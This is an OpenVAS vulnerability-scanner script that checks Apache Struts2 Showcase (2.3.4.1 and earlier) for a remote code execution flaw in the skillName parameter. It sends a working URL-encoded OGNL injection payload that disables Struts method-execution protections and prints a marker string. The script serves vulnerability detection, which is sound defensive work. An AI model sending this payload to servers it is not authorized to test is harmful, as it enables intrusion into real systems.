##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_apache_struts_showcase_code_exec_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Apache Struts2 Showcase Skill Name Remote Code Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902924");
  script_version("$Revision: 13659 $");
  script_bugtraq_id(55165);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-08-31 11:47:31 +0530 (Fri, 31 Aug 2012)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Apache Struts2 Showcase Skill Name Remote Code Execution Vulnerability");

  script_tag(name:"summary", value:"This host is running Apache Struts Showcase and is prone to
  java method execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is is able to execute arbitrary java methods or not.");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of
  user data passed to the 'skillName' parameter in 'edit' and 'save' actions.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute
  arbitrary java method. Further that results to disclose environment variables
  or cause a denial of service or an arbitrary OS command can be executed.");

  script_tag(name:"affected", value:"Apache Struts2 (Showcase) version 2.3.4.1 and prior");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/523956");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115770/struts2-exec.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/apache-struts2-remote-code-execution");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_dependencies("gb_apache_struts2_detection.nasl");
  script_mandatory_keys("ApacheStruts/installed");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!asport = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:asport)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:asport);

url = dir + "/showcase.action";
if(http_vuln_check(port:asport, url:url,pattern:">Showcase</",
                     extra_check:">Struts Showcase<", check_header:TRUE))
{
  postdata = "currentSkill.name=%25%7B%28%23_memberAccess%5B%27allowStatic" +
             "MethodAccess%27%5D%3Dtrue%29%28%23context%5B%27xwork.MethodA" +
             "ccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23tmp%3D%40o" +
             "rg.apache.struts2.ServletActionContext%40getResponse%28%29.g" +
             "etWriter%28%29%2C%23tmp.println%28%27RCEWorked%27%29%2C%23tm" +
             "p.close%28%29%29%7D&currentSkill.description=";

  url = dir + "/skill/save.action";

  asReq = string("POST ", url," HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
  asRes = http_keepalive_send_recv(port:asport, data:asReq);

  if(asRes && asRes =~ "HTTP/1\.[0-9]+ 200" && "RCEWorked" >< asRes)
  {
    security_message(port:asport);
    exit(0);
  }
}

exit(99);